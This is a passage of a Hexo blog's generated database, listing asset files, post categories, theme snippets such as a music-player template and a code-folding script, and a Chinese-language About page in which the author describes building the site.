"_id":"public/2023/08/09/DockerPushAliyun/3.png","hash":"1d967f41049dd8dd66422e9d23fbb6fab04f9871","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/1.jpg","hash":"5271d98621822b25ee690464ea5e705307f65c86","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/12.png","hash":"420874aa9443bcd049dd7689fe23f37fae692835","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/2.jpg","hash":"d9751976742b0d7c345c576eea65abcf654eb1ca","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/5.jpg","hash":"8e3333f1ffe8b127602b1bd1c0b609d4c1892cf3","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/5.png","hash":"e46fd831cc9801263db1c89b05f72a7f11b4ab66","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/8.png","hash":"7a3f62678ce4719602028790ba95437cb5380e83","modified":1714711208104},{"_id":"public/2023/12/10/cronolog/1.png","hash":"8239de2b0f34332e78dc219bf097c7e516fe8299","modified":1714711208104},{"_id":"public/2023/12/10/cronolog/2.png","hash":"5c684fd010e91845b53397d3a9591ae51808f0c0","modified":1714711208104},{"_id":"public/2023/12/10/cronolog/3.png","hash":"c836a71aed396c9dcacde37228e80293e616ccf0","modified":1714711208104},{"_id":"public/2024/01/14/frp/2.png","hash":"a2ff3356901cd24ad78a25a7b222d7d972c60352","modified":1714711208104},{"_id":"public/2023/07/14/gitalk-comment/1.png","hash":"195525cf3dac5def9c9ab68a9c4e98c133a02cbf","modified":1714711208104},{"_id":"public/2023/07/14/gitalk-comment/3.png","hash":"c9e11ce663e41bb1f2ca8fcce53f0b146ae833e0","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/7.png","hash":"f7431320147e368b21deed46270058ab6dad4cb3","modified":1714711208104},{"_id":"public/2024/03/25/install-k8s/2.png","hash":"f90079f9debd3324b4c665d99b2cdda36d01c565","modified":1714711208104},{"_id":"public/2024/03/25/install-k8s/3.png","hash":"318ba9bf5382c62728f7c518b89ae939a28517b6","modified":1714711208104},{"_id":"public/2024/03/25/install-k8s/4.png","hash":"7fedf5af56ac3fa227ecb6634f4d671d484768c9","modified":1714711208104},{"_id":"public/2023/04/07/linux-install-harbor/1.png","hash":"0b171c1b360f221d52a13db88b372711e2de9f61","modified":1714711208104},{"_id":"public/2023/04/07/linux-install-harbor/2.png","hash":"d4ea76b9532de431d082d9fda1f3f22d09ab393c","modified":1714711208104},{"_id":"public/2023/04/07/linux-install-harbor/3.png","hash":"9fc9174dceaad95aa6f8e7416b3f3d14f56ff224","modified":1714711208104},{"_id":"public/2023/04/23/ms08-067/1.png","hash":"2a249be72ebb03c1e9e78ad5ae5b5e0b0d4156a8","modified":1714711208104},{"_id":"public/2023/04/23/ms08-067/3.png","hash":"bd112df033408bb6dd4f504d7e1a2725db647b52","modified":1714711208104},{"_id":"public/2023/04/23/ms08-067/6.png","hash":"7c8b3ece3f1684e59594ae817dd38fcf202baf5f","modified":1714711208104},{"_id":"public/2023/07/25/science-network/3.png","hash":"b420fdde1730fbe5fd01b2a5b4dff3e9aed22cc5","modified":1714711208104},{"_id":"public/2023/07/13/why-mysql-binlog/1.png","hash":"8950a2ed3c7f7e901a47679e93d53c5139cf5466","modified":1714711208104},{"_id":"public/2023/09/12/LocalchatGPT/2.png","hash":"ad64fda955bc183fcac1f7051d3ad6d6aabfa8bf","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/15.png","hash":"60e10980fb653b464de0ba8eba51847220ab2658","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/6.png","hash":"9bf20648d9bc5ce95969da91ce0abcb4ff40791e","modified":1714711208104},{"_id":"public/2023/04/16/crypto/4.png","hash":"8076979772966d2a7517991c8cda021fda330ea7","modified":1714711208104},{"_id":"public/2023/04/16/crypto/6.png","hash":"452a4e6b77e809f3141f5fe83405741950ae27f6","modified":1714711208104},{"_id":"public/2024/01/14/frp/3.png","hash":"1eade1d1fe7b8789314b1bfbf0b96b5d48ec503f","modified":1714711208104},{"_id":"public/2023/12/20/gemini/3.png","hash":"39e3f8ed3c4bda8efa3cf2123566790eaf75edd2","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/2.png","hash":"84a6c8931443219e0c85e16042beb4ac37e60da5","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/4.png","hash":"6106efc3de3fb5b1995e0d230a1ad91162215211","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/5.png","hash":"273f04e561c1ed7f1e19f5673c11ef1d42da3c5c","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/6.png","hash":"80bb9aa8057decdd90a0372092e35021fb716505","modified":1714711208104},{"_id":"public/2023/04/23/ms08-067/2.png","hash":"daf517b6f5b16e27a42defc44f32b8ba4659edbc","modified":1714711208104},{"_id":"public/2023/07/25/science-network/1.jpg","hash":"58ce92575a80e6bf2c171d782b01f5162e3c00d4","modified":1714711208104},{"_id":"public/css/noscript.css","hash":"4cd5301e478e0e0d4b176740ec314087ec5cb707","modified":1714711208104},{"_id":"public/js/bookmark.js","hash":"0f563ffbf05fad30e854e413ab17ff7164ab5a53","modified":1714711208104},{"_id":"public/js/comments-buttons.js","hash":"1a7344440321713426a0b2ab17e276b5bdf85ade","modified":1714711208104},{"_id":"public/js/comments.js","hash":"66ae2e26ea36a41b72c638ea8b220296638ae952","modified":1714711208104},{"_id":"public/js/motion.js","hash":"770d63c26f22705311028a36b52e999cc8a2da82","modified":1714711208104},{"_id":"public/js/config.js","hash":"4c4ebbe3b3f3841a26f9d5af6d0ba8bc6da01c54","modified":1714711208104},{"_id":"public/js/next-boot.js","hash":"da0f07f9eaaa83de70128b0feaea3fdadb90457a","modified":1714711208104},{"_id":"public/js/pjax.js","hash":"b03ba78c6916ad2f390d55bc1bc18fafb64b0ebf","modified":1714711208104},{"_id":"public/js/schedule.js","hash":"a1333258726caf84f368a8f8454639c7dc1626bb","modified":1714711208104},{"_id":"public/js/schemes/muse.js","hash":"ba7ba2c129d1f240c6a22cec3e53f3f22af64b6b","modified":1714711208104},{"_id":"public/js/third-party/fancybox.js","hash":"c098d14e65dd170537134358d4b8359ad0539c2c","modified":1714711208104},{"_id":"public/js/third-party/pace.js","hash":"0ef04218b93561ba4d0ff420d556c3d90a756d32","modified":1714711208104},{"_id":"public/js/third-party/analytics/baidu-analytics.js","hash":"f629acc46ff40c071ffd31b77d5c7616f0fdd778","modified":1714711208104},{"_id":"public/js/third-party/quicklink.js","hash":"eed02e6fced8e5a653077205d4d4d7834ca71472","modified":1714711208104},{"_id":"public/js/third-party/analytics/google-analytics.js","hash":"59684383385059dc4f8a1ff85dbbeb703bcdbcb5","modified":1714711208104},{"_id":"public/js/third-party/analytics/growingio.js","hash":"78dd3cf04082b7dbe6246e404b2aa8e726922402","modified":1714711208104},{"_id":"public/js/third-party/analytics/matomo.js","hash":"c6a25b26a1443caa70b47fd3dfa282271574deb5","modified":1714711208104},{"_id":"public/js/third-party/chat/gitter.js","hash":"cc38c94125f90dadde11b5ebac7d8bf99a1a08a2","modified":1714711208104},{"_id":"public/js/third-party/chat/chatra.js","hash":"c32180522788c10e51df1803aa6842ef0432ddc9","modified":1714711208104},{"_id":"public/js/third-party/chat/tidio.js","hash":"b0079f6a4601e06ca6fe46e83a2f5af553e9bc3c","modified":1714711208104},{"_id":"public/js/third-party/comments/disqus.js","hash":"da361917d65e5dca8362f8cdeb6c8cc0e8316cec","modified":1714711208104},{"_id":"public/js/third-party/comments/changyan.js","hash":"260d1a77d6a3bb33a579d3e4cca1997003e799b5","modified":1714711208104},{"_id":"public/js/third-party/comments/disqusjs.js","hash":"1e826dea3f684c0515f362dc1352447a1f0eae71","modified":1714711208104},{"_id":"public/js/third-party/comments/gitalk.js","hash":"0ec038cf83e8ec067534f16a54041e47a3c1e59a","modified":1714711208104},{"_id":"public/js/third-party/comments/isso.js","hash":"753a873b6f566aff5ba77ca23f91b78eb880ca64","modified":1714711208104},{"_id":"public/js/third-party/comments/livere.js","hash":"2247d88c934c765c43013337860774aaa99f0b31","modified":1714711208104},{"_id":"public/js/third-party/comments/utterances.js","hash":"f67f90eb03e284c82da2b8cf2f1e31801813c16d","modified":1714711208104},{"_id":"public/js/third-party/math/katex.js","hash":"83c54ee536e487a1031783443fe0cb63b1b4767e","modified":1714711208104},{"_id":"public/js/third-party/math/mathjax.js","hash":"5c749b9c1c3bb738122d0516211ecff6496d4907","modified":1714711208104},{"_id":"public/js/third-party/search/algolia-search.js","hash":"fdb7b7cef1a147d897e7f7cd8903b58368ec2062","modified":1714711208104},{"_id":"public/js/third-party/search/local-search.js","hash":"4536cb6d0a9bbaaa86fab3fa0101f6a3a3ec5a76","modified":1714711208104},{"_id":"public/js/third-party/statistics/firestore.js","hash":"6e0682bb42170d61b13b786295f45f9c785f8b73","modified":1714711208104},{"_id":"public/js/third-party/tags/mermaid.js","hash":"f27d817b0c2138dd3215b1f46af0753f60a008f3","modified":1714711208104},{"_id":"public/js/third-party/statistics/lean-analytics.js","hash":"835cbf54c49ef1327f47df70ff2636ad36b6f57d","modified":1714711208104},{"_id":"public/js/third-party/tags/pdf.js","hash":"af78c22f0e61c8c8aa8794e585e0d632c6d4fcb8","modified":1714711208104},{"_id":"public/css/main.css","hash":"0da3f504eea437d6c63cbd9f33882f3a5ce7e840","modified":1714711208104},{"_id":"public/2023/04/21/CVE-2020-0796/10.png","hash":"63c49b48e40c0d318c62b6f4559fc2c8e9cadb90","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/3.png","hash":"95d563ac621a6e97ca56a15f7ad1cd5ec5f0352e","modified":1714711208104},{"_id":"public/2023/04/17/Python-encrypted-file/2.png","hash":"f5bf3b17325dc4992236aa10e089b3b33ba213db","modified":1714711208104},{"_id":"public/2023/08/14/RedisDel/1.png","hash":"15acdbc928f2fbed60e7ce3662948e455de2d1c3","modified":1714711208104},{"_id":"public/2023/12/16/blog-add-MM/1.png","hash":"25ffce458ac832d23c5f9ddb9a06b646dd5c58a1","modified":1714711208104},{"_id":"public/2023/07/17/changyan-comment/6.png","hash":"cb291ed35e40d0d4722d10247afa1d3b8d09b085","modified":1714711208104},{"_id":"public/2023/04/16/crypto/3.png","hash":"a45d3786bafde2c8d31f12b955b28672187d22f2","modified":1714711208104},{"_id":"public/2023/04/16/crypto/5.png","hash":"4d0f455fe18dd7e5fa2d6b1eb1c79e6f3bf21e66","modified":1714711208104},{"_id":"public/2023/04/16/crypto/7.png","hash":"2f98abd4ffb5e4c889ba8e432fd9ac784ca32dc3","modified":1714711208104},{"_id":"public/2023/04/16/crypto/9.png","hash":"0ea27d9567199df6735e0c8596169ca575f22b73","modified":1714711208104},{"_id":"public/2023/05/31/eve-import-img/2.png","hash":"5e8df2608de93f879640e8c6c5f307d15b2be813","modified":1714711208104},{"_id":"public/2023/09/07/hexo-music/3.png","hash":"8585b15abb30d632069a7d0cd3a45b7b69a14607","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/3.png","hash":"7020509612978451919ca0d7ec19563d5e8cebd8","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/5.png","hash":"131deefbeb6f64ac74f357f400dc70c301fad118","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/7.png","hash":"1b1d931e6ac2c08e886b11b807280bbd3ece60ca","modified":1714711208104},{"_id":"public/js/utils.js","hash":"5e1cf39de050964e97fb3ba0825aeec7f4bc36dd","modified":1714711208104},{"_id":"public/2023/08/09/DockerPushAliyun/5.png","hash":"2c2635476983a43301a85d24ad297061e0620e89","modified":1714711208104},{"_id":"public/2023/04/17/Python-encrypted-file/1.png","hash":"9121b0c8e77ee621e2634e839fa63da74635bb45","modified":1714711208104},{"_id":"public/2023/04/17/Python-encrypted-file/3.png","hash":"eb046219d4499458ca33448f6c13aaa701f332eb","modified":1714711208104},{"_id":"public/2023/04/16/crypto/10.png","hash":"aaf87d67fb561d9878792b3b4db49ed117e4cb4e","modified":1714711208104},{"_id":"public/2023/04/16/crypto/2.png","hash":"78a57192f10a9b46e7abe06d83f73515c7dccb33","modified":1714711208104},{"_id":"public/2023/04/16/crypto/8.png","hash":"4036c20b05ebe03ec5a69eff54a993f2de6bc3ac","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/1.png","hash":"1bd6c7ebe75c96d45dc80465a955b5eae8cbe75f","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/3.png","hash":"144b68262ee4d6de004c52c59eba4fbea58303c6","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/4.png","hash":"c119aa130efaac96d946357cdd9fdf8e36767e91","modified":1714711208104},{"_id":"public/2023/04/23/ms08-067/5.png","hash":"cf769ecd833557328f79a5731dfc9e96968667b2","modified":1714711208104},{"_id":"public/2023/04/22/CVE-2019-0708/4.png","hash":"2e78674a943d8cded90b5f0f073851bb990f3a9b","modified":1714711208104},{"_id":"public/2023/09/12/LocalchatGPT/1.png","hash":"660d20dc71a117691e3917d70afb8c9de6939cd7","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/1.webp","hash":"be2c50fb30bfd7a8a30d0408b032eccb6da1ecdc","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/17.png","hash":"5d69dbf24a8339ad7f535655578736f955c32b04","modified":1714711208104},{"_id":"public/2023/12/20/gemini/1.png","hash":"9ebf46adc30962c72d9c493bf91a415de37bd8b1","modified":1714711208104},{"_id":"public/2023/12/20/gemini/2.png","hash":"cec74bb6682c15518ed85ea492844a19aaf7022a","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/6.png","hash":"9074c3588c9c8823a51cf2e66f0d3b686f28f646","modified":1714711208104},{"_id":"public/2023/06/04/keepalived-linux/2.png","hash":"1de404000d16c794b10e8055af14f29d5e6f8429","modified":1714711208104},{"_id":"public/2023/08/09/DockerPushAliyun/1.png","hash":"080c05cbc3bee954bb6899e8b24657d7d673c1f8","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/10.png","hash":"16843a121aee80082050b6902f1445d3c3cb6d02","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/6.jpg","hash":"acef95275f025d0a1b65220faf3954f8acc97d98","modified":1714711208104},{"_id":"public/2023/04/16/crypto/11.png","hash":"49f43dddea5f7254b3c78f029e25049bf2ff9494","modified":1714711208104},{"_id":"public/2023/04/21/CVE-2020-0796/2.png","hash":"d9381a866c7f1d49dbae214ee18a09a748f08f37","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/2.png","hash":"2a4cf64eb7a1e174503a4faf04d1daa4418ed68d","modified":1714711208104},{"_id":"public/2023/07/17/changyan-comment/3.png","hash":"44e78d10f2a8aa79f010a6251ecf1ac195f560a9","modified":1714711208104},{"_id":"public/2023/04/16/crypto/1.png","hash":"3273c892435a1a56f4b84774a721abea4cb9a3c0","modified":1714711208104},{"_id":"public/2023/12/24/pandora-next/1.png","hash":"773d272f1834d5c4fcd961a2a32c41c82eac5904","modified":1714711208104},{"_id":"public/images/summer.jpg","hash":"ffe48b6f19b2d98d49b8ea6f2c1e183af42686c7","modified":1714711208104},{"_id":"public/2023/04/22/CVE-2019-0708/8.png","hash":"599589269c4d61943da22acbc26eac4576ea79c9","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/1.png","hash":"0debd254b0871151cf305007d8b8b438aacc45af","modified":1714711208104},{"_id":"public/images/sky.jpg","hash":"32416391d6451c58cb9e46948593b65ed6f772d0","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/4.jpg","hash":"4924d80495196a275022db92a25bfe10f095a04f","modified":1714711208104},{"_id":"public/2023/04/22/heartbleed/9.png","hash":"c38e490845d911a75e24e5757c0dfc4516f5397c","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/13.png","hash":"63d72b147b3c28043a6af352ddd9d7f335971257","modified":1714711208104},{"_id":"public/2023/09/12/LocalchatGPT/3.png","hash":"5331fb0ba492d014717e932731c13a88fe9cd0a2","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/18.png","hash":"d0b5cd78741b30e7a018a83533ed9e16ab54ee52","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/2.gif","hash":"a3b3216786e14dd8996a2aceabf1ab8339486b48","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/16.png","hash":"4953f37963864d04888ffc13223255656d10dfe0","modified":1714711208104},{"_id":"public/2023/09/10/OpenSourceSofts/1.gif","hash":"7b4a04cdda65c86d6814ff6c066cb8b6d64364a6","modified":1714711208104}],"Category":[{"name":"理论知识","_id":"clvq6s5cp00047zj34twchvoa"},{"name":"技术","_id":"clvq6s5d2000f7zj32ich0z0s"},{"name":"博客搭建","_id":"clvq6s5d7000n7zj37mqoe9je"},{"name":"学习过程","_id":"clvq6s5dj001d7zj33i5n74yp"},{"name":"探索","_id":"clvq6s5dx00227zj37spm0qlr"},{"name":"小玩意儿","_id":"clvq6s5ec00377zj30om039gk"},{"name":"娱乐","_id":"clvq6s5gl008f7zj34t3tcywa"}],"Data":[{"_id":"APlayer","data":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}"},{"_id":"body-end","data":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>"},{"_id":"footer","data":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>"},{"_id":"styles","data":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n"},{"_id":"variables","data":""}],"Page":[{"title":"ABOUT ME","date":"2023-04-16T02:34:11.000Z","type":"about","_content":"\n### 我\n\n我只是这茫茫人海的80亿分之一，真的不太重要。\n\n### 从0到1建站\n\n这次建站真的是从0到1建的这个站，之前 Github 上的站，是直接fork的别人的站，因为 Github 上的站多多少少都会适配 Github ，比如直接采用 Github 的头像进行网站某个部分的一部分。\n\n在国内 Gitee 上又与 Github 有很大的不同，gitee采用pages搭建站，只能给仓库取名字为个人空间的名字，而在 Github 上取名字是“个人空间的名字+ github.io”，这个最大的区别就在于在gitee上是没有办法通过搜索来得到别人的搭建好的pages仓库，而在 Github 上可以通过搜索“github.io”进行查找，来找到别人搭建的站点。\n\n从下载node.js，安装HEXO开始，一步一步开始搭建自己的这个网站，历时到我开始写这个about文件已经有3天了。期间走过的弯路确实不少，之后我会专门做一个分类，来把我搭建博客的过程和遇到的问题来进行汇总，帮助后来者少走弯路。\n\n### 为什么做这个站\n\n* 为了在这个互联网世界里给自己拓展出一个清静之地吧。\n\n* 之前在 Github 上其实已经有一个站了，也正因为[**之前那个站**](http://liuxpblog.eu.org)搭建在 Github 上的原因，国内访问起来速度也是一流的感人。所以就打算在 Gitee 上再搭建一个站。\n\n### 这个站用来干什么\n\n我初中时还很热爱QQ空间，经常发表动态；到高中开始用微信，偶尔还会发几条朋友圈，后来大一，再到之后在部队待的日子里，使我完全不再想向别人展示自己的生活了。到现在我QQ空间最后一条停留在了21年，发表的朋友圈也仅仅不到20条。真的是被这个嘈杂的互联网世界影响到了，直到后来我慢慢接触到了个人博客，我真的是被这个小玩意吸引到了。我很喜欢这种倾诉心声的感觉，在这里我就是老大。是只属于我一个人的地方。\n\n在这个站里面，我会记录自己在学习上学到的好玩的技能，记录在网络上学到某些技能，归纳汇总，呈现出来，最后还会偶尔拿来记录一下生活中的日常。\n\n### 联系我\n\nQQ邮箱：`liuxp731@qq.com`   \nGoogle邮箱：`liuxiaopeng731@gmail.com`","source":"about/index.md","raw":"---\ntitle: ABOUT ME\ndate: 2023-04-16 10:34:11\ntype: \"about\"\n---\n\n### 我\n\n我只是这茫茫人海的80亿分之一，真的不太重要。\n\n### 从0到1建站\n\n这次建站真的是从0到1建的这个站，之前 Github 上的站，是直接fork的别人的站，因为 Github 上的站多多少少都会适配 Github ，比如直接采用 Github 的头像进行网站某个部分的一部分。\n\n在国内 Gitee 上又与 Github 有很大的不同，gitee采用pages搭建站，只能给仓库取名字为个人空间的名字，而在 Github 上取名字是“个人空间的名字+ github.io”，这个最大的区别就在于在gitee上是没有办法通过搜索来得到别人的搭建好的pages仓库，而在 Github 上可以通过搜索“github.io”进行查找，来找到别人搭建的站点。\n\n从下载node.js，安装HEXO开始，一步一步开始搭建自己的这个网站，历时到我开始写这个about文件已经有3天了。期间走过的弯路确实不少，之后我会专门做一个分类，来把我搭建博客的过程和遇到的问题来进行汇总，帮助后来者少走弯路。\n\n### 为什么做这个站\n\n* 为了在这个互联网世界里给自己拓展出一个清静之地吧。\n\n* 之前在 Github 上其实已经有一个站了，也正因为[**之前那个站**](http://liuxpblog.eu.org)搭建在 Github 上的原因，国内访问起来速度也是一流的感人。所以就打算在 Gitee 上再搭建一个站。\n\n### 这个站用来干什么\n\n我初中时还很热爱QQ空间，经常发表动态；到高中开始用微信，偶尔还会发几条朋友圈，后来大一，再到之后在部队待的日子里，使我完全不再想向别人展示自己的生活了。到现在我QQ空间最后一条停留在了21年，发表的朋友圈也仅仅不到20条。真的是被这个嘈杂的互联网世界影响到了，直到后来我慢慢接触到了个人博客，我真的是被这个小玩意吸引到了。我很喜欢这种倾诉心声的感觉，在这里我就是老大。是只属于我一个人的地方。\n\n在这个站里面，我会记录自己在学习上学到的好玩的技能，记录在网络上学到某些技能，归纳汇总，呈现出来，最后还会偶尔拿来记录一下生活中的日常。\n\n### 联系我\n\nQQ邮箱：`liuxp731@qq.com`   \nGoogle邮箱：`liuxiaopeng731@gmail.com`","updated":"2024-05-03T03:55:54.889Z","path":"about/index.html","comments":1,"layout":"page","_id":"clvq6s5ch00007zj3d3m04xd4","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"我\"><a href=\"#我\" class=\"headerlink\" title=\"我\"></a>我</h3><p>我只是这茫茫人海的80亿分之一，真的不太重要。</p>\n<h3 id=\"从0到1建站\"><a href=\"#从0到1建站\" class=\"headerlink\" title=\"从0到1建站\"></a>从0到1建站</h3><p>这次建站真的是从0到1建的这个站，之前 Github 上的站，是直接fork的别人的站，因为 Github 上的站多多少少都会适配 Github ，比如直接采用 Github 的头像进行网站某个部分的一部分。</p>\n<p>在国内 Gitee 上又与 Github 有很大的不同，gitee采用pages搭建站，只能给仓库取名字为个人空间的名字，而在 Github 上取名字是“个人空间的名字+ github.io”，这个最大的区别就在于在gitee上是没有办法通过搜索来得到别人的搭建好的pages仓库，而在 Github 上可以通过搜索“github.io”进行查找，来找到别人搭建的站点。</p>\n<p>从下载node.js，安装HEXO开始，一步一步开始搭建自己的这个网站，历时到我开始写这个about文件已经有3天了。期间走过的弯路确实不少，之后我会专门做一个分类，来把我搭建博客的过程和遇到的问题来进行汇总，帮助后来者少走弯路。</p>\n<h3 id=\"为什么做这个站\"><a href=\"#为什么做这个站\" class=\"headerlink\" title=\"为什么做这个站\"></a>为什么做这个站</h3><ul>\n<li><p>为了在这个互联网世界里给自己拓展出一个清静之地吧。</p>\n</li>\n<li><p>之前在 Github 上其实已经有一个站了，也正因为<a href=\"http://liuxpblog.eu.org/\"><strong>之前那个站</strong></a>搭建在 Github 上的原因，国内访问起来速度也是一流的感人。所以就打算在 Gitee 上再搭建一个站。</p>\n</li>\n</ul>\n<h3 id=\"这个站用来干什么\"><a href=\"#这个站用来干什么\" class=\"headerlink\" title=\"这个站用来干什么\"></a>这个站用来干什么</h3><p>我初中时还很热爱QQ空间，经常发表动态；到高中开始用微信，偶尔还会发几条朋友圈，后来大一，再到之后在部队待的日子里，使我完全不再想向别人展示自己的生活了。到现在我QQ空间最后一条停留在了21年，发表的朋友圈也仅仅不到20条。真的是被这个嘈杂的互联网世界影响到了，直到后来我慢慢接触到了个人博客，我真的是被这个小玩意吸引到了。我很喜欢这种倾诉心声的感觉，在这里我就是老大。是只属于我一个人的地方。</p>\n<p>在这个站里面，我会记录自己在学习上学到的好玩的技能，记录在网络上学到某些技能，归纳汇总，呈现出来，最后还会偶尔拿来记录一下生活中的日常。</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p>QQ邮箱：<code>liuxp731@qq.com</code><br>Google邮箱：<code>liuxiaopeng731@gmail.com</code></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = 